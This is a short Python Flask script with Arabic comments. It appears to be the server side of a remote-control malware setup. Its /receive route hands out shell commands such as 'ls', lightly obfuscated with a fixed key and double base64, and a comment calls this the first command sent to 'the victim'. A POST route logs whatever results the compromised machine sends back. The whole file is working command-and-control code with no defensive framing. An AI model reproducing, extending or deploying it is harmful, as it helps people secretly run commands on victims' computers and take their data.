from flask import Flask, request, jsonify
import base64

app = Flask(__name__)

KEY = b'DEMANX'

def encrypt_cmd(cmd):
    raw = base64.b64encode(cmd.encode())
    return base64.b64encode(KEY + raw).decode()

@app.route('/', methods=['GET'])
def index():
    return "✅ السيرفر شغال!"

@app.route('/receive', methods=['POST', 'GET'])
def receive():
    if request.method == 'POST':
        data = request.get_json()
        print("📩 وصلك أمر:", data)
        return {"status": "ok"}
    elif request.method == 'GET':
        if request.args.get("cmd") == "1":
            encrypted = encrypt_cmd("ls")  # أول أمر نرسله للضحية
            return jsonify({"cmd": encrypted})
        else:
            return jsonify({"cmd": ""})
    return "Invalid method", 405

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
